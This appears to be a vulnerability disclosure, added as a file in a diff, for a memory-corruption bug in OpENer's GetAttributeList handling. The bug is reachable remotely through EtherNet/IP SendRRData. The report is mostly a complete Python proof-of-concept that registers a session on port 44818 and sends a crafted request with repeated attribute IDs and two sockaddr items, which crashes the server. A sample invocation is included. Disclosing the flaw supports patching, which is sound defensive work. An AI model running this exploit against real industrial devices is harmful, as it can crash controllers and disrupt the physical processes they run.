@@ -1,0 +1,100 @@
+issue #576
+
+Summary
+I found a remotely reachable server-side memory corruption issue in the current master branch of OpENer in the unconnected explicit-message SendRRData path.
+
+The root cause is in GetAttributeList(): the response-space estimation for each returned attribute entry underestimates the actual encoded size by 4 bytes per attribute item. Specifically, the estimation accounts for the attribute value length, but it does not account for the fixed per-entry metadata that is always written afterward:
+
+Attribute ID (2 bytes)
+status (1 byte)
+reserved (1 byte)
+With a valid GetAttributeList request against Identity instance 1, repeatedly requesting attribute 1, the underestimated inner Message Router response first corrupts outer response metadata during response assembly. When the request also carries two valid optional sockaddr info items (0x8000 and 0x8001), AssembleLinearMessage() continues encoding those legal CPF items and eventually crashes in AddIntToMessage() using the already-corrupted current_message_position.
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+PORT = 44818
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    sock.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN"))
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def sockaddr_item(type_id: int, port: int, ip: str) -> bytes:
+    ip_be = struct.unpack("!I", socket.inet_aton(ip))[0]
+    return struct.pack("<HHHHI8s", type_id, 16, socket.AF_INET, port, ip_be, b"\x00" * 8)
+
+
+def wrap_send_rr_data_with_sockaddr(session: int, cip: bytes, context: bytes, both_items: bool) -> bytes:
+    items = [
+        struct.pack("<HH", 0x0000, 0x0000),  # Null Address Item
+        struct.pack("<HH", 0x00B2, len(cip)) + cip,  # Unconnected Data Item
+        sockaddr_item(0x8000, 0x2222, "192.168.153.200"),
+    ]
+    if both_items:
+        items.append(sockaddr_item(0x8001, 0x2223, "192.168.153.201"))
+
+    payload = struct.pack("<IH", 0, 0) + struct.pack("<H", len(items)) + b"".join(items)
+    return encap(0x006F, session, payload, context)
+
+
+def build_get_attribute_list(count: int, attribute: int) -> bytes:
+    cip = bytes([0x03, 0x02, 0x20, 0x01, 0x24, 0x01])
+    cip += struct.pack("<H", count)
+    cip += struct.pack("<" + "H" * count, *([attribute] * count))
+    return cip
+
+
+def main() -> int:
+    host = sys.argv[1] if len(sys.argv) > 1 else HOST
+    count = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+    attribute = int(sys.argv[3]) if len(sys.argv) > 3 else 1
+    both_items = bool(int(sys.argv[4])) if len(sys.argv) > 4 else True
+
+    cip = build_get_attribute_list(count, attribute)
+    probe = wrap_send_rr_data_with_sockaddr(0, cip, b"GLSOCKO!", both_items)
+    print(
+        f"host={host} count={count} attribute={attribute} both_items={int(both_items)} "
+        f"cip_len={len(cip)} packet_len={len(probe)}"
+    )
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        sock.sendall(wrap_send_rr_data_with_sockaddr(session, cip, b"GLSOCKO!", both_items))
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    if response:
+        print(f"response_len={len(response)} response={response.hex()}")
+    else:
+        print("response=timeout")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+python3 poc.py 192.168.153.128 80 1 1
+
